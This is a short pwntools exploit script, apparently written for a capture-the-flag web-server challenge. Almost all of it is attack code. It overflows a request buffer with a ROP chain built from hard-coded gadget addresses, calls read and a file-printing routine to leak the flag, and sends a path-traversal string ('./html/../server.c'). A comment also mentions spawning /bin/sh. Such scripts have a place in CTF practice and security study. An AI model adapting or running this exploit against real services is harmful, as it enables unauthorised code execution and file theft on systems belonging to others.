from pwn import *

elf = ELF("./server")
libc = elf.libc

#target = remote("pwn.bsidesahmedabad.in", 9080)
target = remote("localhost", 9080)


def sla(d):
	target.sendline(str(d) + '\r')

pop_rdi = p64(0x0000000000401c93)
pop_rsi = p64(0x0000000000401698)
adder_gad = p64(0x00000000004015cc)		# add dword ptr [rbp - 0x3d], ebx ; nop ; ret
#pop_rbp = p64(0x00000000004015cd)
popper_gad = p64(0x0000000000401691)	# pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
file_printer = p64(0x00000000004019ef)
buf = 0x404140

def get_call(rdi, rsi, rip):
	return pop_rdi + p64(rdi) + pop_rsi + p64(rsi) + p64(rip)

# Works only locally, need to know remote_socket to read flag from remote server, or try calling /bin/sh
#'''
remtoe_socket = 4
payload = "GET /flag\x00" + "_"*(0x100-11) + '\r' + "A"*8 + "B"*8 + "C"*8 + p64(remtoe_socket) + p64(buf+0x80) + p64(buf+0x100) + p64(buf+0x180)
payload += get_call(remtoe_socket, buf, elf.plt['read']) + pop_rdi + p64(buf) + file_printer + p64(0x80)*10
sla(payload)
target.sendlineafter("Not Found", "./html/../server.c\x00")
#'''

target.interactive()
